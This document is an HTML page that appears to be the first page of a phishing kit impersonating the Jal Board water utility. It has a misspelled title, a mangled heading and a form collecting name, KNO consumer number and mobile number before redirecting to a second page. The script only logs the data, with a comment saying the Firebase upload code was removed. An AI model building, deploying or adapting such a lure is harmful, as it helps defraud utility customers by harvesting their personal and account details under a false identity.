<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>dehijlbrd</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #FFFFFF;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    img {
      width: 100%;
      max-width: 300px;
      border-radius: 10px;
    }
    .form-container {
      margin-top: 30px;
      background: white;
      padding: 20px;
      border-radius: 10px;
      max-width: 100%;
      width: 100%;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .form-container h2 {
      background-color: #00008b;
      color: white;
      padding: 12px;
      font-size: 20px;
      border-radius: 5px;
    }
    label {
      font-size: 16px;
      font-weight: bold;
      display: block;
      margin-top: 15px;
      text-align: left;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 12px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    .side-button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: #FF0000;
      color: #FFFFFF;
      border: none;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/s9ptXmZv/images-5.jpg" alt="Meri Tasveer" />

  <div class="form-container">
    <h2>जल¥बोर्ड</h2>
    <form onsubmit="submitForm(event)">
      <label for="name">Name*</label>
      <input type="text" id="name" placeholder="Full Name" required />

      <label for="kno">Kno Number*</label>
      <input type="text" id="kno" placeholder="KNO Number" required />

      <label for="mobile">Mobile*</label>
      <input type="text" id="mobile" placeholder="Mobile Number" required />

      <button class="side-button" type="submit">Continue</button>
    </form>
  </div>

  <script>
    function submitForm(e) {
      e.preventDefault();
      const name = document.getElementById("name").value;
      const kno = document.getElementById("kno").value;
      const mobile = document.getElementById("mobile").value;

      // Firebase-related code removed
      // You can add custom code here to handle form submission (like sending to server)
      console.log("Form submitted:", { name, kno, mobile });

      // Redirect to next page
      window.location.href = "page2.html";
    }
  </script>
</body>
</html>
